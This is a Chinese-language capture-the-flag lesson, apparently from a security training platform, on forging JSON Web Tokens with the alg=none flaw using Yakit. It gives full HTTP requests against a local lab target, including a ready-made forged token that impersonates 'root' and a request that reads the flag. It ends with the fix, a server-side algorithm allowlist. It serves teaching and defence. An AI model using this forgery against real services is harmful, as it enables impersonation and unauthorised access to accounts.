---
title: JWT 伪造：alg=none 的免签冒充
difficulty: practitioner
---

# JWT 伪造：alg=none 的免签冒充

## 原理背景

JWT 把"身份声明"直接交给客户端保管：`header.payload.signature` 三段、以 `.` 分隔，前两段只是 **base64url 编码的 JSON**（注意是 URL 安全字母表、无填充，不是标准 base64），不加密、人人可读。安全性全靠第三段签名——服务端用密钥验签，确认"这个 token 真是我发的、没被改过"。

`alg: none` 是最讽刺的实现缺陷：库允许 token 自述"我不需要签名"，服务端居然照办。于是**任何人都能签发任意身份的 token**。更妙的是本题靶场读身份读的是 **header** 里的 `username` 字段——伪造面直接开在最前面。

## Yakit 操作步骤

**Codec 是本课主角**：

1. 登录拿到合法 token——注意登录返回的是一个 **HTML 页面**，token 字符串（`eyJ...` 三段式）展示在页面里，把它复制出来；
2. 打开 **Codec**，把 token 的第一段粘进去做 **base64url 解码**——看到了 header 的 JSON 原文；对第二段如法炮制；
3. 反向操作：把你想要的 header JSON 做 **base64url 编码**（URL 安全、去掉 `=` 填充），重新拼出伪造 token；
4. `alg=none` 时第三段签名为**空串**——token 以结尾的 `.` 收尾（`header.payload.`）。

**Web Fuzzer 验证**：带着 `Authorization: Bearer <伪造 token>` 请求资料接口，观察服务端认不认。

## 开始实战

点击 **前往配套题目练习**，启动环境后：

1. `POST /jwt/unsafe-login1`（**表单字段** `username`/`password`，用 `user1` / `password123`）登录，从返回页面复制 token；
2. 用 Codec 拆开 token，确认身份声明写在 header 里；
3. 构造 `{"alg":"none","username":"root"}` 形态的新 header，base64url 编码后拼出 `新header.原payload.`（末尾保留点）；
4. 带 `Authorization: Bearer` 头请求 `/jwt/unsafe-login1/profile`，拿到 root 资料；
5. 返回 root 的资料（`id` 与 `username`）即伪造成功。然后读取靶机 flag（`GET /flag`）并提交，完成本题。

<details>
<summary>📋 详细步骤（点击展开，照做即可拿到答案）</summary>

以下以实例地址 `http://127.0.0.1:36870` 为例——**端口每次启动环境都随机分配，请替换成你题目页显示的端口**。

**第 1 步：启动实验环境**

题目详情页点「启动实验环境」，等状态 running，复制访问地址（形如 `http://127.0.0.1:36870`）。

**第 2 步：表单登录拿 token**

登录是**表单提交**（不是 JSON），`Content-Type` 用 `application/x-www-form-urlencoded`：

```http
POST /jwt/unsafe-login1 HTTP/1.1
Host: 127.0.0.1:36870
Content-Type: application/x-www-form-urlencoded

username=user1&password=password123
```

响应是一个 HTML 页面，页面正文中展示着 token（一段 `eyJ` 开头的三段式字符串），把它整段复制出来，例如：

```
eyJhZ2UiOjI1LCJhbGciOiJIUzI1NiIsImtpZCI6MywidHlwZSI6IkpXVCIsInVzZXJuYW1lIjoidXNlcjEifQ.eyJ1c2VybmFtZSI6InVzZXIxIn0.0Yx...
```

**第 3 步：Codec 解码看结构**

把第一段（第一个 `.` 之前）粘进 Codec 做 **base64url 解码**：

```json
{"age":25,"alg":"HS256","kid":3,"typ":"JWT","username":"user1"}
```

第二段解码是 `{"username":"user1"}`——注意身份（`username`）写在 **header** 里，这正是伪造点。

**第 4 步：伪造 alg=none 的 token**

构造新 header 并做 **base64url 编码**（URL 安全字母表、去掉末尾 `=` 填充）：

```json
{"alg":"none","username":"root"}
```

编码结果是固定的（可直接使用）：

```
eyJhbGciOiJub25lIiwidXNlcm5hbWUiOiJyb290In0
```

拼出伪造 token：`新header.原payload.`——即**你编码的新 header + `.` + 第 2 步 token 的第二段 + `.`**（末尾保留点，签名为空）：

```
eyJhbGciOiJub25lIiwidXNlcm5hbWUiOiJyb290In0.eyJ1c2VybmFtZSI6InVzZXIxIn0.
```

**第 5 步：带伪造 token 请求资料接口**

```http
GET /jwt/unsafe-login1/profile HTTP/1.1
Host: 127.0.0.1:36870
Authorization: Bearer eyJhbGciOiJub25lIiwidXNlcm5hbWUiOiJyb290In0.eyJ1c2VybmFtZSI6InVzZXIxIn0.
```

响应（`200`，JSON）：

```json
[{"age":25,"created_at":"...","id":2,"username":"root"}]
```

——服务端把 header 里自报的 `username=root` 当成了身份。对照：把同样的伪造 token 发给 `/jwt/safe-login/profile`，只会得到 `invalid auth token`（严格验签）。

**第 5 步：读取本实例 flag**

靶机为本次启动的环境单独生成了唯一 flag（形如 `flag{lab-xxxx}`），存在靶机文件系统的 `/flag.txt`，也可以直接请求靶机根路径的读取端点：

```http
GET /flag HTTP/1.1
Host: 127.0.0.1:36870
```

响应就是 flag 原文（一行，`flag{lab-...}`）。

**第 6 步：提交答案**

回到题目详情页，在答案框输入刚读到的 flag 原文（`flag{lab-...}` 整串）提交。

</details>

## 延伸：用现成 POC 批量检测

插件市场里有大量 nuclei 兼容的 JWT 检测规则（弱密钥、alg 混淆、none 接受等）。从 **插件市场** 检索 JWT 相关插件，对靶机执行一次，观察它能否自动发现本课的缺陷——单点手工利用 vs 规模化检测，两者结合才是完整能力。修复视角：服务端必须硬编码允许的算法白名单，绝不信 token 自述的 `alg`。

下一专题：服务端攻击面——SSRF 与文件上传。
